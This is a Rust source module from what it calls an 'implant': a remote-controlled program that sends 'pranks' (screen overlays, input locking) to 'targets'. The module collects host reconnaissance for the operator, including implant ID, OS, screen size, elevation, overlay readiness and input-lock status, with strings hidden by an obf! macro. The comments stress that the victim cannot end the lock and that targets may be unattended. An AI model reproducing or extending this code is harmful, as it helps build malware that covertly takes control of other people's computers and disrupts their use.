//! Host reporting.
//!
//! `sysinfo` exists so an operator can tell whether a target is worth sending a
//! prank at before sending one. On Windows the answer is nearly always yes: the
//! only things that can get in the way are a session with no interactive
//! desktop (a locked screen, or a service account), which the overlay count and
//! the screen size below make obvious.

use crate::gui;
use crate::obf;

/// The operating system, as reported at registration and here.
pub fn os_name() -> &'static str {
    std::env::consts::OS
}

/// Whether a window can be created at all.
///
/// False only when the process is running without an interactive window station,
/// which is the one situation where every overlay command is guaranteed to fail
/// and it is worth saying so before one is sent.
pub fn gui_available() -> bool {
    gui::win::has_window_station()
}

/// The body of the `sysinfo` command result.
pub fn report() -> String {
    let mut lines = vec![
        format!("implant: {}", crate::config::IMPLANT_ID),
        format!("os: {}", os_name()),
        format!("gui overlays: {}", if gui_available() { "available" } else { "unavailable" }),
    ];

    match gui::win::screen_size() {
        Some((w, h)) => lines.push(format!("screen: {w}x{h}")),
        None => lines.push(obf!("screen: could not be determined").to_string()),
    }

    // Windows can report whether it is elevated, which is the difference
    // between `lockinput` working and being refused.
    lines.push(format!("elevated: {}", gui::win::is_elevated()));

    // The overlay host is started lazily by the first visual command, so this
    // is the one place an operator learns that it cannot start at all - a target
    // with no usable OpenGL implementation, say - before sending a prank to a
    // host that cannot show it.
    lines.push(gui::host_status());
    lines.push(gui::describe_overlays());

    // A continuous `lockinput` is invisible otherwise, and the operator is the
    // only one who can end it - worth saying it is on the line that is read
    // before doing anything else.
    if let Some(status) = gui::input_lock_status() {
        lines.push(status);
    }

    // Anything that panicked. On a target nobody is sitting at, stderr is nowhere
    // to look, so without this the only symptom of a dead overlay backend is a
    // command that quietly did nothing.
    for entry in crate::log::recent_panics() {
        lines.push(format!("panic: {entry}"));
    }

    lines.join("\n")
}
